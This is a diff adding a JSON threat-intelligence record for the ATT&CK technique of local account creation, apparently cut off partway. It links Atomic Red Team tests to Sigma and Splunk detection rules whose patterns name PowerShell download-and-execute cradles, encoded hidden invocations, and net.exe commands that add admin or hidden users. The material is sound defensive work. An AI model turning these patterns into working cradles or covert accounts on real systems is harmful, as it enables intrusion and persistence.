@@ -1,0 +1,484 @@
+{
+    "id": "T1136.001",
+    "name": "Local Account",
+    "description": "Adversaries may create a local account to maintain access to victim systems. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service. With a sufficient level of access, the `net user /add` command can be used to create a local account. On macOS systems the `dscl -create` command can be used to create a local account.\nSuch accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.",
+    "platforms": "Linux, macOS, Windows",
+    "kill_chain_phases": "Persistence",
+    "data_sources": "User Account: User Account Creation, Process: Process Creation, Command: Command Execution",
+    "detection": "Monitor for processes and command-line parameters associated with local account creation, such as `net user /add` , `useradd` , and `dscl -create` . Collect data on account creation within a network. Event ID 4720 is generated when a user account is created on a Windows system. (Citation: Microsoft User Creation Event) Perform regular audits of local system accounts to detect suspicious accounts that may have been created by an adversary.",
+    "url": "https://attack.mitre.org/techniques/T1136/001",
+    "enrichments": {
+        "attack_rule_map": [
+            {
+                "tech_id": "T1136.001",
+                "atomic_attack_guid": "2170d9b5-bacd-4819-a952-da76dae0815f",
+                "atomic_attack_name": "Create a new Windows admin user via .NET",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "PowerShell Download and Execution Cradles",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_download_iex.yml",
+                        "remote_content": "title: PowerShell Download and Execution Cradles\nid: 85b0b087-eddf-4a2b-b033-d771fa2b9775\nstatus: test\ndescription: Detects PowerShell download and execution cradles.\nreferences:\n    - https://github.com/VirtualAlllocEx/Payload-Download-Cradles/blob/88e8eca34464a547c90d9140d70e9866dcbc6a12/Download-Cradles.cmd\n    - https://labs.withsecure.com/publications/fin7-target-veeam-servers\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-03-24\nmodified: 2023-05-04\ntags:\n    - attack.execution\n    - attack.t1059\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_download:\n        CommandLine|contains:\n            - '.DownloadString('\n            - '.DownloadFile('\n            - 'Invoke-WebRequest '\n            - 'iwr '\n    selection_iex:\n        CommandLine|contains:\n            - ';iex $'\n            - '| IEX'\n            - '|IEX '\n            - 'I`E`X'\n            - 'I`EX'\n            - 'IE`X'\n            - 'iex '\n            - 'IEX ('\n            - 'IEX('\n            - 'Invoke-Expression'\n    condition: all of selection_*\nfalsepositives:\n    - Some PowerShell installers were seen using similar combinations. Apply filters accordingly\nlevel: high\n"
+                    },
+                    {
+                        "rule_name": "Suspicious PowerShell Invocations - Specific - ProcessCreation",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_invocation_specific.yml",
+                        "remote_content": "title: Suspicious PowerShell Invocations - Specific - ProcessCreation\nid: 536e2947-3729-478c-9903-745aaffe60d2\nrelated:\n    - id: fce5f582-cc00-41e1-941a-c6fabf0fdb8c\n      type: obsolete\n    - id: ae7fbf8e-f3cb-49fd-8db4-5f3bed522c71\n      type: similar\n    - id: 8ff28fdd-e2fa-4dfa-aeda-ef3d61c62090\n      type: similar\nstatus: test\ndescription: Detects suspicious PowerShell invocation command parameters\nreferences:\n    - Internal Research\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-01-05\ntags:\n    - attack.defense-evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_convert_b64:\n        CommandLine|contains|all:\n            - '-nop'\n            - ' -w '\n            - 'hidden'\n            - ' -c '\n            - '[Convert]::FromBase64String'\n    selection_iex:\n        CommandLine|contains|all:\n            - ' -w '\n            - 'hidden'\n            - '-noni'\n            - '-nop'\n            - ' -c '\n            - 'iex'\n            - 'New-Object'\n    selection_enc:\n        CommandLine|contains|all:\n            - ' -w '\n            - 'hidden'\n            - '-ep'\n            - 'bypass'\n            - '-Enc'\n    selection_reg:\n        CommandLine|contains|all:\n            - 'powershell'\n            - 'reg'\n            - 'add'\n            - '\\software\\'\n    selection_webclient:\n        CommandLine|contains|all:\n            - 'bypass'\n            - '-noprofile'\n            - '-windowstyle'\n            - 'hidden'\n            - 'new-object'\n            - 'system.net.webclient'\n            - '.download'\n    selection_iex_webclient:\n        CommandLine|contains|all:\n            - 'iex'\n            - 'New-Object'\n            - 'Net.WebClient'\n            - '.Download'\n    filter_chocolatey:\n        CommandLine|contains:\n            - \"(New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1\"\n            - 'Write-ChocolateyWarning'\n    condition: 1 of selection_* and not 1 of filter_*\nfalsepositives:\n    - Unknown\nlevel: medium\n"
+                    },
+                    {
+                        "rule_name": "Suspicious PowerShell Download and Execute Pattern",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_susp_download_patterns.yml",
+                        "remote_content": "title: Suspicious PowerShell Download and Execute Pattern\nid: e6c54d94-498c-4562-a37c-b469d8e9a275\nrelated:\n    - id: 3b6ab547-8ec2-4991-b9d2-2b06702a48d7\n      type: derived\nstatus: test\ndescription: Detects suspicious PowerShell download patterns that are often used in malicious scripts, stagers or downloaders (make sure that your backend applies the strings case-insensitive)\nreferences:\n    - https://gist.github.com/jivoi/c354eaaf3019352ce32522f916c03d70\n    - https://www.trendmicro.com/en_us/research/22/j/lv-ransomware-exploits-proxyshell-in-attack.html\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-02-28\nmodified: 2022-03-01\ntags:\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains: # make sure that your backend applies the strings case-insensitive\n            - 'IEX ((New-Object Net.WebClient).DownloadString'\n            - 'IEX (New-Object Net.WebClient).DownloadString'\n            - 'IEX((New-Object Net.WebClient).DownloadString'\n            - 'IEX(New-Object Net.WebClient).DownloadString'\n            - ' -command (New-Object System.Net.WebClient).DownloadFile('\n            - ' -c (New-Object System.Net.WebClient).DownloadFile('\n    condition: selection\nfalsepositives:\n    - Software installers that pull packages from remote systems and execute them\nlevel: high\n"
+                    },
+                    {
+                        "rule_name": "PowerShell Web Download",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_download_cradles.yml",
+                        "remote_content": "title: PowerShell Web Download\nid: 6e897651-f157-4d8f-aaeb-df8151488385\nstatus: test\ndescription: Detects suspicious ways to download files or content using PowerShell\nreferences:\n    - https://github.com/VirtualAlllocEx/Payload-Download-Cradles/blob/88e8eca34464a547c90d9140d70e9866dcbc6a12/Download-Cradles.cmd\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-03-24\nmodified: 2023-01-05\ntags:\n    - attack.command-and-control\n    - attack.execution\n    - attack.t1059.001\n    - attack.t1105\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        CommandLine|contains:\n            - '.DownloadString('\n            - '.DownloadFile('\n            - 'Invoke-WebRequest '\n            - 'iwr '\n    condition: selection\nfalsepositives:\n    - Scripts or tools that download files\nlevel: medium\n"
+                    },
+                    {
+                        "rule_name": "PowerShell Download Pattern",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_download_patterns.yml",
+                        "remote_content": "title: PowerShell Download Pattern\nid: 3b6ab547-8ec2-4991-b9d2-2b06702a48d7\nrelated:\n    - id: e6c54d94-498c-4562-a37c-b469d8e9a275\n      type: derived\nstatus: test\ndescription: Detects a Powershell process that contains download commands in its command line string\nreferences:\n    - https://blog.redteam.pl/2020/06/black-kingdom-ransomware.html\n    - https://lab52.io/blog/winter-vivern-all-summer/\n    - https://hatching.io/blog/powershell-analysis/\nauthor: Florian Roth (Nextron Systems), oscd.community, Jonhnathan Ribeiro\ndate: 2019-01-16\nmodified: 2023-01-26\ntags:\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith:\n              - '\\powershell.exe'\n              - '\\pwsh.exe'\n        - OriginalFileName:\n              - 'PowerShell.EXE'\n              - 'pwsh.dll'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'new-object'\n            - 'net.webclient).'\n            - 'download'\n        CommandLine|contains:\n            - 'string('\n            - 'file('\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium\n"
+                    },
+                    {
+                        "rule_name": "Usage Of Web Request Commands And Cmdlets",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_web_request_cmd_and_cmdlets.yml",
+                        "remote_content": "title: Usage Of Web Request Commands And Cmdlets\nid: 9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d\nrelated:\n    - id: 1139d2e2-84b1-4226-b445-354492eba8ba\n      type: similar\n    - id: f67dbfce-93bc-440d-86ad-a95ae8858c90\n      type: obsolete\n    - id: cd5c8085-4070-4e22-908d-a5b3342deb74\n      type: obsolete\nstatus: test\ndescription: Detects the use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) via CommandLine\nreferences:\n    - https://4sysops.com/archives/use-powershell-to-download-a-file-with-http-https-and-ftp/\n    - https://blog.jourdant.me/post/3-ways-to-download-files-with-powershell\n    - https://learn.microsoft.com/en-us/powershell/module/bitstransfer/add-bitsfile?view=windowsserver2019-ps\nauthor: James Pemberton / @4A616D6573, Endgame, JHasenbusch, oscd.community, Austin Songer @austinsonger\ndate: 2019-10-24\nmodified: 2023-01-10\ntags:\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - '[System.Net.WebRequest]::create'\n            - 'curl '\n            - 'Invoke-RestMethod'\n            - 'Invoke-WebRequest'\n            - 'iwr '\n            - 'Net.WebClient'\n            - 'Resume-BitsTransfer'\n            - 'Start-BitsTransfer'\n            - 'wget '\n            - 'WinHttp.WinHttpRequest'\n    condition: selection\nfalsepositives:\n    - Use of Get-Command and Get-Help modules to reference Invoke-WebRequest and Start-BitsTransfer.\nlevel: medium\n"
+                    }
+                ],
+                "splunk_rules": [
+                    {
+                        "rule_name": "Any Powershell DownloadString",
+                        "rule_link": "https://research.splunk.com/endpoint/4d015ef2-7adf-11eb-95da-acde48001122/"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1136.001",
+                "atomic_attack_guid": "fda74566-a604-4581-a4cc-fbbe21d66559",
+                "atomic_attack_name": "Create a new Windows admin user",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "User Added to Local Administrators Group",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_add_user_local_admin_group.yml",
+                        "remote_content": "title: User Added to Local Administrators Group\nid: ad720b90-25ad-43ff-9b5e-5c841facc8e5\nrelated:\n    - id: ffa28e60-bdb1-46e0-9f82-05f7a61cc06e # Remote Desktop groups\n      type: similar\n    - id: 10fb649c-3600-4d37-b1e6-56ea90bb7e09 # Privileged groups\n      type: similar\nstatus: test\ndescription: Detects addition of users to the local administrator group via \"Net\" or \"Add-LocalGroupMember\".\nreferences:\n    - https://blog.talosintelligence.com/2022/08/recent-cyber-attack.html?m=1\nauthor: Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-08-12\nmodified: 2023-03-02\ntags:\n    - attack.persistence\n    - attack.t1098\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_main:\n        - CommandLine|contains|all:\n              # net.exe\n              - 'localgroup '\n              - ' /add'\n        - CommandLine|contains|all:\n              # powershell.exe\n              - 'Add-LocalGroupMember '\n              - ' -Group '\n    selection_group:\n        CommandLine|contains:\n            - ' administrators '\n            - ' administrateur' # Typo without an 'S' so we catch both\n    condition: all of selection_*\nfalsepositives:\n    - Administrative activity\nlevel: medium\n"
+                    },
+                    {
+                        "rule_name": "Net.EXE Execution",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules-threat-hunting/windows/process_creation/proc_creation_win_net_execution.yml",
+                        "remote_content": "title: Net.EXE Execution\nid: 183e7ea8-ac4b-4c23-9aec-b3dac4e401ac\nstatus: test\ndescription: Detects execution of \"Net.EXE\".\nreferences:\n    - https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/\n    - https://eqllib.readthedocs.io/en/latest/analytics/4d2e7fc1-af0b-4915-89aa-03d25ba7805e.html\n    - https://eqllib.readthedocs.io/en/latest/analytics/e61f557c-a9d0-4c25-ab5b-bbc46bb24deb.html\n    - https://eqllib.readthedocs.io/en/latest/analytics/9b3dd402-891c-4c4d-a662-28947168ce61.html\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1007/T1007.md#atomic-test-2---system-service-discovery---netexe\nauthor: Michael Haag, Mark Woan (improvements), James Pemberton / @4A616D6573 / oscd.community (improvements)\ndate: 2019-01-16\nmodified: 2022-07-11\ntags:\n    - attack.discovery\n    - attack.t1007\n    - attack.t1049\n    - attack.t1018\n    - attack.t1135\n    - attack.t1201\n    - attack.t1069.001\n    - attack.t1069.002\n    - attack.t1087.001\n    - attack.t1087.002\n    - attack.lateral-movement\n    - attack.t1021.002\n    - attack.s0039\n    - detection.threat-hunting\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith:\n              - '\\net.exe'\n              - '\\net1.exe'\n        - OriginalFileName:\n              - 'net.exe'\n              - 'net1.exe'\n    selection_cli:\n        CommandLine|contains:\n            - ' accounts'\n            - ' group'\n            - ' localgroup'\n            - ' share'\n            - ' start'\n            - ' stop '\n            - ' user'\n            - ' view'\n    condition: all of selection_*\nfalsepositives:\n    - Likely\nlevel: low\n"
+                    }
+                ],
+                "splunk_rules": [
+                    {
+                        "rule_name": "Net Localgroup Discovery",
+                        "rule_link": "https://research.splunk.com/endpoint/54f5201e-155b-11ec-a6e2-acde48001122/"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1136.001",
+                "atomic_attack_guid": "6657864e-0323-4206-9344-ac9cd7265a4f",
+                "atomic_attack_name": "Create a new user in a command prompt",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "New User Created Via Net.EXE",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_net_user_add.yml",
+                        "remote_content": "title: New User Created Via Net.EXE\nid: cd219ff3-fa99-45d4-8380-a7d15116c6dc\nrelated:\n    - id: b9f0e6f5-09b4-4358-bae4-08408705bd5c\n      type: similar\nstatus: test\ndescription: Identifies the creation of local users via the net.exe command.\nreferences:\n    - https://eqllib.readthedocs.io/en/latest/analytics/014c3f51-89c6-40f1-ac9c-5688f26090ab.html\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1136.001/T1136.001.md\nauthor: Endgame, JHasenbusch (adapted to Sigma for oscd.community)\ndate: 2018-10-30\nmodified: 2023-02-21\ntags:\n    - attack.persistence\n    - attack.t1136.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith:\n              - '\\net.exe'\n              - '\\net1.exe'\n        - OriginalFileName:\n              - 'net.exe'\n              - 'net1.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'user'\n            - 'add'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate user creation.\n    - Better use event IDs for user creation rather than command line rules.\nlevel: medium\n"
+                    },
+                    {
+                        "rule_name": "Net.EXE Execution",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules-threat-hunting/windows/process_creation/proc_creation_win_net_execution.yml",
+                        "remote_content": "title: Net.EXE Execution\nid: 183e7ea8-ac4b-4c23-9aec-b3dac4e401ac\nstatus: test\ndescription: Detects execution of \"Net.EXE\".\nreferences:\n    - https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/\n    - https://eqllib.readthedocs.io/en/latest/analytics/4d2e7fc1-af0b-4915-89aa-03d25ba7805e.html\n    - https://eqllib.readthedocs.io/en/latest/analytics/e61f557c-a9d0-4c25-ab5b-bbc46bb24deb.html\n    - https://eqllib.readthedocs.io/en/latest/analytics/9b3dd402-891c-4c4d-a662-28947168ce61.html\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1007/T1007.md#atomic-test-2---system-service-discovery---netexe\nauthor: Michael Haag, Mark Woan (improvements), James Pemberton / @4A616D6573 / oscd.community (improvements)\ndate: 2019-01-16\nmodified: 2022-07-11\ntags:\n    - attack.discovery\n    - attack.t1007\n    - attack.t1049\n    - attack.t1018\n    - attack.t1135\n    - attack.t1201\n    - attack.t1069.001\n    - attack.t1069.002\n    - attack.t1087.001\n    - attack.t1087.002\n    - attack.lateral-movement\n    - attack.t1021.002\n    - attack.s0039\n    - detection.threat-hunting\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith:\n              - '\\net.exe'\n              - '\\net1.exe'\n        - OriginalFileName:\n              - 'net.exe'\n              - 'net1.exe'\n    selection_cli:\n        CommandLine|contains:\n            - ' accounts'\n            - ' group'\n            - ' localgroup'\n            - ' share'\n            - ' start'\n            - ' stop '\n            - ' user'\n            - ' view'\n    condition: all of selection_*\nfalsepositives:\n    - Likely\nlevel: low\n"
+                    }
+                ],
+                "splunk_rules": [
+                    {
+                        "rule_name": "Network Connection Discovery With Net",
+                        "rule_link": "https://research.splunk.com/endpoint/640337e5-6e41-4b7f-af06-9d9eab5e1e2d/"
+                    }
+                ]
+            }
+        ],
+        "cycat": {
+            "cycat": {
+                "cycat_related_uuids": [
+                    "ffa28e60-bdb1-46e0-9f82-05f7a61cc06e",
+                    "51719bf5-e4fd-4e44-8ba8-b830e7ac0731",
+                    "759d0d51-bc99-4b5e-9add-8f5b2c8e7512",
+                    "75578840-9526-4b2a-9462-af469a45e767",
+                    "7b449a5e-1db5-4dd0-a2dc-4e3a67282538",
+                    "66b6be3d-55d0-4f47-9855-d69df21740ea",
+                    "460479f3-80b7-42da-9c43-2cc1d54dbccd",
+                    "b9f0e6f5-09b4-4358-bae4-08408705bd5c",
+                    "243de76f-4725-4f2e-8225-a8a69b15ad61",
+                    "cd219ff3-fa99-45d4-8380-a7d15116c6dc",
+                    "0ac15ec3-d24f-4246-aa2a-3077bb1cf90e",
+                    "635cbe30-392d-4e27-978e-66774357c762",
+                    "1bbf25b9-8038-4154-a50b-118f2a32be27",
+                    "6d844f0f-1c18-41af-8f19-33e7654edfc3"
+                ],
+                "lookup_results": [
+                    {
+                        "uuid": "ffa28e60-bdb1-46e0-9f82-05f7a61cc06e",
+                        "lookup_data": {
+                            "description": "Detects suspicious command line in which a user gets added to the local Remote Desktop Users group",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2021/12/06\ndescription: Detects suspicious command line in which a user gets added to the local\n  Remote Desktop Users group\ndetection:\n  condition: all of selection_*\n  selection_group:\n    CommandLine|contains:\n    - Remote Desktop Users\n    - \"Utilisateurs du Bureau \\xE0 distance\"\n    - Usuarios de escritorio remoto\n  selection_main:\n  - CommandLine|contains|all:\n    - 'localgroup '\n    - ' /add'\n  - CommandLine|contains|all:\n    - 'Add-LocalGroupMember '\n    - ' -Group '\nfalsepositives:\n- Administrative activity\nfields:\n- CommandLine\n- ParentCommandLine\nid: ffa28e60-bdb1-46e0-9f82-05f7a61cc06e\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/09/09\nreferences:\n- https://www.microsoft.com/security/blog/2021/11/16/evolving-trends-in-iranian-threat-actor-activity-mstic-presentation-at-cyberwarcon-2021/\nrelated:\n- id: ad720b90-25ad-43ff-9b5e-5c841facc8e5\n  type: similar\nstatus: experimental\ntags:\n- attack.persistence\n- attack.lateral_movement\n- attack.t1133\n- attack.t1136.001\n- attack.t1021.001\ntitle: Suspicious Add User to Remote Desktop Users Group\n",
+                            "sigma:id": "ffa28e60-bdb1-46e0-9f82-05f7a61cc06e",
+                            "title": "Suspicious Add User to Remote Desktop Users Group",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "51719bf5-e4fd-4e44-8ba8-b830e7ac0731",
+                        "lookup_data": {
+                            "description": "Detects the creation of a new user account. Such accounts may be used for persistence that do not require persistent remote access tools to be deployed on the system.",
+                            "raw": "author: Alejandro Ortuno, oscd.community\ndate: 2020/10/06\ndescription: Detects the creation of a new user account. Such accounts may be used\n  for persistence that do not require persistent remote access tools to be deployed\n  on the system.\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains: create\n    Image|endswith: /dscl\nfalsepositives:\n- Legitimate administration activities\nid: 51719bf5-e4fd-4e44-8ba8-b830e7ac0731\nlevel: low\nlogsource:\n  category: process_creation\n  product: macos\nmodified: 2021/11/27\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1136.001/T1136.001.md\nstatus: test\ntags:\n- attack.t1136.001\n- attack.persistence\ntitle: Creation Of A Local User Account\n",
+                            "sigma:id": "51719bf5-e4fd-4e44-8ba8-b830e7ac0731",
+                            "title": "Creation Of A Local User Account",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "759d0d51-bc99-4b5e-9add-8f5b2c8e7512",
+                        "lookup_data": {
+                            "description": "Detects the creation of a new user account. Such accounts may be used for persistence that do not require persistent remote access tools to be deployed on the system.",
+                            "raw": "author: Marie Euler, Pawel Mazur\ndate: 2020/05/18\ndescription: Detects the creation of a new user account. Such accounts may be used\n  for persistence that do not require persistent remote access tools to be deployed\n  on the system.\ndetection:\n  condition: 1 of selection_*\n  selection_add_user_record_type:\n    type: ADD_USER\n  selection_syscall_record_type:\n    exe|endswith: /useradd\n    type: SYSCALL\nfalsepositives:\n- Admin activity\nid: 759d0d51-bc99-4b5e-9add-8f5b2c8e7512\nlevel: medium\nlogsource:\n  product: linux\n  service: auditd\nmodified: 2022/12/20\nreferences:\n- https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/security_guide/sec-understanding_audit_log_files\n- https://access.redhat.com/articles/4409591#audit-record-types-2\n- https://www.youtube.com/watch?v=VmvY5SQm5-Y&ab_channel=M45C07\nstatus: test\ntags:\n- attack.t1136.001\n- attack.persistence\ntitle: Creation Of An User Account\n",
+                            "sigma:id": "759d0d51-bc99-4b5e-9add-8f5b2c8e7512",
+                            "title": "Creation Of An User Account",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "75578840-9526-4b2a-9462-af469a45e767",
+                        "lookup_data": {
+                            "description": "Detects patterns as noticed in exploitation of Serv-U CVE-2021-35211 vulnerability by threat group DEV-0322",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2021/07/14\ndescription: Detects patterns as noticed in exploitation of Serv-U CVE-2021-35211\n  vulnerability by threat group DEV-0322\ndetection:\n  condition: selection_whoami and 1 of selection_cmd*\n  selection_cmd_1:\n    CommandLine|contains:\n    - ./Client/Common/\n    - .\\Client\\Common\\\n  selection_cmd_2:\n    CommandLine|contains: C:\\Windows\\Temp\\Serv-U.bat\n  selection_whoami:\n    CommandLine|contains: whoami\nfalsepositives:\n- Unlikely\nid: 75578840-9526-4b2a-9462-af469a45e767\nlevel: critical\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/12/18\nreferences:\n- https://www.microsoft.com/security/blog/2021/07/13/microsoft-discovers-threat-actor-targeting-solarwinds-serv-u-software-with-0-day-exploit/\nstatus: test\ntags:\n- attack.persistence\n- attack.t1136.001\n- cve.2021.35211\ntitle: Serv-U Exploitation CVE-2021-35211 by DEV-0322\n",
+                            "sigma:id": "75578840-9526-4b2a-9462-af469a45e767",
+                            "title": "Serv-U Exploitation CVE-2021-35211 by DEV-0322",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "7b449a5e-1db5-4dd0-a2dc-4e3a67282538",
+                        "lookup_data": {
+                            "description": "Detects the creation of a local hidden user account which should not happen for event ID 4720.",
+                            "raw": "author: Christian Burkard (Nextron Systems)\ndate: 2021/05/03\ndescription: Detects the creation of a local hidden user account which should not\n  happen for event ID 4720.\ndetection:\n  condition: selection\n  selection:\n    EventID: 4720\n    TargetUserName|endswith: $\nfalsepositives:\n- Unknown\nfields:\n- EventCode\n- AccountName\nid: 7b449a5e-1db5-4dd0-a2dc-4e3a67282538\nlevel: high\nlogsource:\n  product: windows\n  service: security\nmodified: 2022/10/09\nreferences:\n- https://twitter.com/SBousseaden/status/1387743867663958021\nstatus: test\ntags:\n- attack.persistence\n- attack.t1136.001\ntitle: Hidden Local User Creation\n",
+                            "sigma:id": "7b449a5e-1db5-4dd0-a2dc-4e3a67282538",
+                            "title": "Hidden Local User Creation",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "66b6be3d-55d0-4f47-9855-d69df21740ea",
+                        "lookup_data": {
+                            "description": "Detects local user creation on windows servers, which shouldn't happen in an Active Directory environment. Apply this Sigma Use Case on your windows server logs and not on your DC logs.",
+                            "raw": "author: Patrick Bareiss\ndate: 2019/04/18\ndescription: Detects local user creation on windows servers, which shouldn't happen\n  in an Active Directory environment. Apply this Sigma Use Case on your windows server\n  logs and not on your DC logs.\ndetection:\n  condition: selection\n  selection:\n    EventID: 4720\n    Provider_Name: Microsoft-Windows-Security-Auditing\nfalsepositives:\n- Domain Controller Logs\n- Local accounts managed by privileged account management tools\nfields:\n- EventCode\n- AccountName\n- AccountDomain\nid: 66b6be3d-55d0-4f47-9855-d69df21740ea\nlevel: low\nlogsource:\n  product: windows\n  service: security\nmodified: 2021/01/17\nreferences:\n- https://patrick-bareiss.com/detecting-local-user-creation-in-ad-with-sigma/\nstatus: test\ntags:\n- attack.persistence\n- attack.t1136.001\ntitle: Local User Creation\n",
+                            "sigma:id": "66b6be3d-55d0-4f47-9855-d69df21740ea",
+                            "title": "Local User Creation",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "460479f3-80b7-42da-9c43-2cc1d54dbccd",
+                        "lookup_data": {
+                            "description": "Sysmon registry detection of a local hidden user account.",
+                            "raw": "author: Christian Burkard (Nextron Systems)\ndate: 2021/05/03\ndescription: Sysmon registry detection of a local hidden user account.\ndetection:\n  condition: selection\n  selection:\n    Image|endswith: \\lsass.exe\n    TargetObject|contains: \\SAM\\SAM\\Domains\\Account\\Users\\Names\\\n    TargetObject|endswith: $\nfalsepositives:\n- Unknown\nid: 460479f3-80b7-42da-9c43-2cc1d54dbccd\nlevel: high\nlogsource:\n  category: registry_event\n  product: windows\nmodified: 2022/08/05\nreferences:\n- https://twitter.com/SBousseaden/status/1387530414185664538\nstatus: experimental\ntags:\n- attack.persistence\n- attack.t1136.001\ntitle: Creation of a Local Hidden User Account by Registry\n",
+                            "sigma:id": "460479f3-80b7-42da-9c43-2cc1d54dbccd",
+                            "title": "Creation of a Local Hidden User Account by Registry",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "b9f0e6f5-09b4-4358-bae4-08408705bd5c",
+                        "lookup_data": {
+                            "description": "Detects creation of local users via the net.exe command with the option \"never expire\"",
+                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/07/12\ndescription: Detects creation of local users via the net.exe command with the option\n  \"never expire\"\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains|all:\n    - user\n    - add\n    - expires:never\n    Image|endswith:\n    - \\net.exe\n    - \\net1.exe\nfalsepositives:\n- Unlikely\nid: b9f0e6f5-09b4-4358-bae4-08408705bd5c\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2023/02/01\nreferences:\n- https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/\nrelated:\n- id: cd219ff3-fa99-45d4-8380-a7d15116c6dc\n  type: derived\nstatus: test\ntags:\n- attack.persistence\n- attack.t1136.001\ntitle: New User Created Via Net.EXE With Never Expire Option\n",
+                            "sigma:id": "b9f0e6f5-09b4-4358-bae4-08408705bd5c",
+                            "title": "New User Created Via Net.EXE With Never Expire Option",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "243de76f-4725-4f2e-8225-a8a69b15ad61",
+                        "lookup_data": {
+                            "description": "Detects creation of a local user via PowerShell",
+                            "raw": "author: '@ROxPinTeddy'\ndate: 2020/04/11\ndescription: Detects creation of a local user via PowerShell\ndetection:\n  condition: selection\n  selection:\n    ScriptBlockText|contains: New-LocalUser\nfalsepositives:\n- Legitimate user creation\nid: 243de76f-4725-4f2e-8225-a8a69b15ad61\nlevel: medium\nlogsource:\n  category: ps_script\n  definition: 'Requirements: Script Block Logging must be enabled'\n  product: windows\nmodified: 2022/12/25\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1136.001/T1136.001.md\nstatus: test\ntags:\n- attack.execution\n- attack.t1059.001\n- attack.persistence\n- attack.t1136.001\ntitle: PowerShell Create Local User\n",
+                            "sigma:id": "243de76f-4725-4f2e-8225-a8a69b15ad61",
+                            "title": "PowerShell Create Local User",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "cd219ff3-fa99-45d4-8380-a7d15116c6dc",
+                        "lookup_data": {
+                            "description": "Identifies the creation of local users via the net.exe command.",
